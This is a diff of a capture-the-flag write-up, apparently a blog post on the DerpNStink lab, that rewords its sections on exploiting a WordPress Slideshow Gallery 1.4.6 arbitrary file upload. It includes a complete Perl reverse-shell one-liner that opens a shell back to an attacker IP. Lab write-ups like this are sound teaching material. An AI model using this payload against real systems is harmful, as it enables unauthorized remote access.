@@ -204,9 +204,9 @@ There's another hint from `/webnotes/info.txt` to do likewise.
 
 ### Slideshow Gallery < 1.4.7 Arbitrary File Upload
 
-Using `wpscan` to identify vulnerable WordPress plugins, I'm able to find a particular version (1.4.6) that has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/), installed in WordPress.
+I list down all the plugins installed in WordPress with `wpscan`, and I find a particular version (1.4.6) of the Slideshow Gallery plugin that has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
 
-I wrote `upload.sh`, a `bash` script to upload files based on the vulnerability.
+I wrote `upload.sh`, a `bash` script to upload files, exploiting the vulnerability.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -264,7 +264,7 @@ The uploaded file is at `http://derpnstink.local/weblog/wp-content/uploads/slide
 
 ### Low-Privilege Shell
 
-After the upload, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell; the reason being Perl is widely available in most Linux distributions.
+After the upload, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell; Perl is widely available in most Linux distributions.
 
 ```perl
 perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
